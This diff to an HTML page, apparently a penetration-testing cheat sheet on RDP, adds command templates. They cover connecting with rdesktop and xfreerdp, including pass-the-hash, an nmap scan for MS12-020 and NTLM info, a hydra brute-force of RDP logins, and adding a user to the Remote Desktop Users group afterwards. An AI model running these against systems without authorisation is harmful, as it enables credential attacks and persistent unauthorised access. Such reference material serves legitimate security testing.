@@ -78,7 +78,20 @@
                 <article>
                   <div id="contain">
                     <h3>Connecting</h3>
-                    <pre><code class="language-bash">xfreerdp /v:x.x.x.x /u:user /p:pass123 +clipboard</code>
+                    <div>
+                      <pre><code class="language-bash">
+rdesktop -u user x.x.x.x
+rdesktop -d domain -u user -p pass123 x.x.x.x
+xfreerdp [/d:domain] /u:user /p:pass123 /v:x.x.x.x +clipboard
+xfreerdp [/d:domain] /u:user /pth:hash /v:x.x.x.x #Pass the hash</code></pre>
+                    </div>
+                    <h3>Enum</h3>
+                    <div><pre><code class="language-bash">nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 x.x.x.x</code></pre></div>
+                    <h3>Brute</h3>
+                    <div><pre><code class="language-bash">hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp</code></pre></div>
+                    <h3>Post</h3>
+                    <div><pre><code>#add to rdp group
+net localgroup "Remote Desktop Users" UserLoginName /add</code></pre></div>
                   </div>
                 </article>
               </div>
